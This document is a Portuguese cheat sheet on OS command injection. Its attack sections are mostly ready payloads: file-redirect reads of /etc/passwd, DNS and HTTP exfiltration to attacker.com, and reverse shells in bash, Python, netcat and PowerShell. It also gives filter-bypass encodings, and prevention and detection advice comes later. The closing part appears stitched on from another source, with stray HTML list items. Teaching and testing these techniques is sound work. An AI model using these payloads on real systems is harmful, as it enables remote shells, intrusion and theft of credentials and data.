# OS Command Injection

## 📊 Metadados

| Propriedade | Valor |
|---|---|
| **CVSS Score** | 9.8 (Crítico) |
| **OWASP Top 10** | #1 - Injection |
| **CWE** | CWE-78 |
| **Status** | ⚠️ Ativo e crítico |
| **Impacto** | Execução de código arbitrário no servidor |
| **Severidade** | 🔴 CRÍTICO |

---

## 🔍 O que é Command Injection?

A injeção de comandos do SO (também conhecida como injeção de shell) permite que um atacante execute comandos arbitrários do sistema operacional no servidor. Isso resulta em:

- **Remote Code Execution (RCE)** - Execução de qualquer comando
- **Compromisso total do servidor** - Acesso root/admin
- **Acesso a dados sensíveis** - Roubos de credenciais, arquivos
- **Movimento lateral** - Comprometer outra infraestrutura
- **Negação de Serviço** - Derrubar o servidor

---

## 💥 Exemplos Práticos de Exploração

### 1. **Command Injection Básica (Error-Based)**

**Cenário:** Aplicação verifica estoque de produtos via comando shell

```
URL: https://insecure-website.com/stockStatus?productID=381&storeID=29
Comando executado: stockreport.pl 381 29
```

**Payload - Echo test:**
```
productID: 381&echo aiwefwlguh&
Comando resultante: stockreport.pl 381 & echo aiwefwlguh & 29
```

**Separadores de comando (Unix):**
```
;         - Executa sequencialmente
|         - Pipe (saída do primeiro como entrada do segundo)
||        - OU lógico (executa se anterior falhar)
&         - Background (executa em paralelo)
&&        - E lógico (executa se anterior suceder)
$(cmd)    - Command substitution
`cmd`     - Command substitution (backticks)
\n        - Newline
```

**Separadores (Windows):**
```
&         - Concatenação
&&        - E lógico
|         - Pipe
||        - OU lógico
(cmd)     - Subshell
```

---

### 2. **RCE via Redirecionamento de Arquivo**

**Objetivo:** Executar comando e ler saída via browser

```bash
# Payload
& whoami > /var/www/html/whoami.txt &

# Acesso
https://vulnerable-website.com/whoami.txt
→ www-data

# Payload avançado
& cat /etc/passwd > /var/www/html/passwd.txt &

# Extração de múltiplos dados
& (whoami; hostname; id; pwd) > /var/www/html/output.txt &
```

---

### 3. **Blind Command Injection - Time-Based Detection**

**Cenário:** Saída do comando não é retornada

**Teste com delay:**
```bash
# 10 segundos de espera
& ping -c 10 127.0.0.1 &        (Linux/Mac)
& ping -n 10 127.0.0.1 &         (Windows)

# Sleep
& sleep 10 &                      (Linux/Mac)

# Timeout
& timeout 10 &                    (Windows)
```

**Técnica condicional:**
```bash
# Se a condição é true, aguarda 10 segundos
& if [ "$(whoami)" == "root" ]; then sleep 10; fi &

# Baseado em arquivo
& if [ -f /etc/passwd ]; then sleep 10; fi &
```

---

### 4. **Out-of-Band (OOB) Data Exfiltration**

**Via DNS:**
```bash
# Payload básico
& nslookup attacker.com &

# Com dados
& nslookup `whoami`.attacker.com &
→ DNS query: www-data.attacker.com

# Extração de dados sensíveis
& nslookup `cat /etc/passwd | head -1`.attacker.com &
```

**Via HTTP:**
```bash
# Curl callback
& curl http://attacker.com/?data=$(whoami) &

# Wget
& wget http://attacker.com/?user=$(id) &

# PowerShell (Windows)
& powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')" &
```

---

### 5. **Reverse Shell**

**Bash:**
```bash
& bash -i >& /dev/tcp/attacker.com/4444 0>&1 &
```

**Python:**
```bash
& python -c 'import socket,subprocess;s=socket.socket();s.connect(("attacker.com",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())' &
```

**NC (Netcat):**
```bash
& nc -e /bin/sh attacker.com 4444 &
```

**PowerShell (Windows):**
```powershell
& powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/rev.ps1')" &
```

---

### 6. **Blind Command Injection - OAST Techniques**

**Usando Burp Collaborator:**
```bash
# Payload
& nslookup {BURP_COLLABORATOR_ID} &

# Verificar em: Burp → Collaborator → Poll now
```

**Usando Interactsh:**
```bash
# Verificar DNS query
& nslookup $(whoami).interactsh.com &
```

---

## 🚨 Métodos de Injeção

### Shell Metacharacters

```bash
# Linux/Mac - Caracteres especiais
|     - Pipe
&     - Background
;     - Command separator
$()   - Command substitution
``    - Backticks substitution
~     - Home directory
!     - History expansion
*     - Globbing
?     - Globbing
[     - Globbing
]     - Globbing

# Windows - Caracteres especiais
|     - Pipe
&     - Concatenação
&&    - AND lógico
||    - OR lógico
^     - Escape character
%     - Variable
! (cmd.exe) - History expansion
```

---

### Filter Bypass Techniques

**Case variation:**
```bash
WhoAmI
WHOAMI
WhOaMi
```

**Encoding:**
```bash
# Base64
& echo d2hvYW1p | base64 -d | bash &

# Octal
& /bin/bash -c $'\x77\x68\x6f\x61\x6d\x69' &

# Hex
& echo 7768616d69 | xxd -r -p | bash &
```

**Variable expansion:**
```bash
# Environment variables
& $USER      # Current user
& $HOME      # Home directory
& $PATH      # System PATH
& $(echo whoami)
```

**Comment stripping:**
```bash
# Remover comentários com sed
whoam#i  → whoami (# é comentário em bash)
```

---

## 🛡️ Contramedidas e Prevenção

### 1. **Evitar Execução de Shell**
```python
# ❌ Vulnerável
os.system(f"echo {user_input}")
subprocess.call(cmd, shell=True)

# ✅ Seguro
subprocess.call(['/usr/bin/echo', user_input])  # Array, sem shell
subprocess.call(cmd, shell=False)
```

### 2. **Whitelist de Comandos**
```python
# ✅ Seguro
ALLOWED_COMMANDS = ['ls', 'pwd', 'whoami']
if command not in ALLOWED_COMMANDS:
    raise ValueError("Comando não permitido")
```

### 3. **Input Validation**
```python
import re
# Aceitar apenas caracteres alfanuméricos
if not re.match(r'^[a-zA-Z0-9]+$', user_input):
    raise ValueError("Input inválido")
```

### 4. **Use APIs, não shell scripts**
```python
# ❌ Vulnerável
os.system(f"ls {directory}")

# ✅ Seguro
import os
os.listdir(directory)
```

### 5. **Principle of Least Privilege**
- Aplicação rodando com user limitado (não root)
- Filesystem permissions restritivos
- No sudo access sem password

### 6. **Sandbox/Containerização**
- Docker com capabilities reduzidas
- AppArmor/SELinux profiles
- VM isolation

---

## 🔎 Detecção em Tempo Real

### Padrões Suspeitos
```
; cat /etc/passwd
| whoami
& nslookup
$(whoami)
`whoami`
> /tmp/output
```

### WAF Rules
```
ModSecurity / OWASP ModSecurity Core Rule Set (CRS)
- CRS Rule 930100: Command Injection Attacks
- Pattern matching para metacharacters
```

### Ferramentas de Teste
- **Commix:** Detecção automática
- **Burp Suite:** Extensão intruder
- **Metasploit:** Exploits prontos

---

## 📚 Referências

| Fonte | Link |
|---|---|
| PortSwigger Academy | https://portswigger.net/web-security/os-command-injection |
| OWASP Command Injection | https://owasp.org/www-community/attacks/Command_Injection |
| HackTricks OS Command | https://book.hacktricks.xyz/pentesting-web/command-injection |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection |
| CWE-78 | https://cwe.mitre.org/data/definitions/78.html |
| GTFOBins | https://gtfobins.github.io/ |

---

**Última atualização:** Agosto 2026

<li>`whoami`</li>
<li>$(whoami)</li>

Observe que os diferentes metacaracteres do shell têm comportamentos sutilmente diferentes que podem afetar se eles funcionam em determinadas situações e se permitem a recuperação na banda da saída do comando ou são úteis apenas para exploração do tipo blind.

Às vezes, a entrada que você controla aparece entre aspas no comando original. Nessa situação, você precisa encerrar o contexto citado (usando " ou ') antes de usar metacaracteres do shell adequados para injetar um novo comando.

<h2>Como previnir ataques de command Injection?</h2>

A forma mais efetiva de previnir uma injeção de comandos é nunca chamar comandos da camada de aplicação. Existe maneiras alternativas para implementar essa funcionalidade usando plataformas de API segura.

Nunca tente sanitizar a entrada escapando dos metacaracteres do shell. Na prática, isso é muito propenso a erros e vulnerável a ser contornado por um invasor habilidoso.
